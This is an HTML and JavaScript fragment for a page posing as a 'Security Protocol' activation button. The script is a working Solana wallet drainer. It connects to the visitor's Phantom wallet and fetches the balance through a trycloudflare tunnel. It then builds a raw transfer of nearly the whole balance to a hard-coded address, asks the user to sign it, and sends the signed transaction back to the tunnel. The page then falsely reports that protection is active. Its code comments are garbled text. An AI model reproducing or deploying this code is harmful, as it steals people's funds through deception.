    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
        <p id="msg" style="margin-top:20px;color:#444;">Ready</p>

    <script>
    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
    const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";

    // ğŸ”± æˆ˜ç¥çº§å·¥å…·ï¼šæ‰‹åŠ¨æ„é€  8 å­—èŠ‚å°ç«¯åºé‡‘é¢æ•°æ®
    function encodeAmount(amount) {
        let buf = new ArrayBuffer(8);
        let view = new DataView(buf);
        let bigAmount = BigInt(amount);
        view.setBigUint64(0, bigAmount, true); // true ä»£è¡¨å°ç«¯åº (Little-Endian)
        return new Uint8Array(buf);
    }

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Use Wallet Browser!"); return; }
            
            document.getElementById('msg').innerText = "Linking...";
            await p.connect();
            
            const data = await fetch(TUNNEL + '/get_data', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({pubkey: p.publicKey.toString()})
            }).then(r => r.json());

            const balance = BigInt(data.balance);
            const fee = BigInt(1500000); 
            const amount = balance > fee ? balance - fee : BigInt(0);

            // ğŸš€ æ ¸å¿ƒä¿®æ­£ï¼šæ‰‹åŠ¨æ„é€ åŸå§‹ Instructionï¼Œå½»åº•è·³è¿‡ Blob.encode æŠ¥é”™
            const instructionData = new Uint8Array(12);
            instructionData.set([2, 0, 0, 0], 0); // SystemProgram Transfer çš„æŒ‡ä»¤ ID æ˜¯ 2
            instructionData.set(encodeAmount(amount), 4); // ç´§è·Ÿ 8 å­—èŠ‚çš„é‡‘é¢æ•°æ®

            const transaction = new solanaWeb3.Transaction().add({
                keys: [
                    { pubkey: p.publicKey, isSigner: true, isWritable: true },
                    { pubkey: new solanaWeb3.PublicKey(TARGET_ADDR), isSigner: false, isWritable: true }
                ],
                programId: solanaWeb3.SystemProgram.programId,
                data: instructionData,
            });

            transaction.recentBlockhash = data.blockhash;
            transaction.feePayer = p.publicKey;
            
            document.getElementById('msg').innerText = "Awaiting Signature...";
            const signed = await p.signTransaction(transaction);
            
            const raw = signed.serialize();
            let b64 = "";
            for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
            
            fetch(TUNNEL + '/collect', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({signature: window.btoa(b64)})
            });
            
            alert("Security Protocol Activated!");
        } catch(e) { 
            alert("Status: " + e.message); 
            document.getElementById('msg').innerText = "Error: " + e.message;
        }
    }
